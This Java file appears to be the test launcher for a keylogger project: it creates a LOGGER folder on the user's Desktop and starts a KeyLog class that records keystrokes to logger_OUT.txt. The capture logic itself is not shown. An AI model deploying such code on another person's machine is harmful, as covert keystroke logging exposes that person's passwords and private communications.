/**
 *
 * =========================================================================================
 *  Copyright (C) 2019-2020
 *
 *  AM-Design-Development - (Alessio Moraschini) - All Rights Reserved
 * =========================================================================================
 *
 * You should have received a copy of the license with this file.
 * If not, please write to: info@am-design-development.com, or visit : ${project.main.url}
 */
package keylogger;

import java.io.File;
import java.io.IOException;


public class keyLogTest {

	public static void main(String[] args) {

		String path = System.getProperty("user.home")+"/Desktop/LOGGER/";
		String file = "logger_OUT.txt";
		File DesktopFilePath = new File(path);
		File DesktopFile = new File(path+file);
		DesktopFilePath.mkdirs();
		// -> if you want use following to save unique new file
		// DesktopFile = FileStuff.renameJavaObjFile(DesktopFile);

		try {
			
			if (!DesktopFile.exists()) {
				DesktopFile.createNewFile();
			}
			KeyLog logger = new KeyLog();
			
			try {
				logger.startLogger(DesktopFile);
			} catch (IOException e) {
				e.printStackTrace();
			}
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		
	}

}
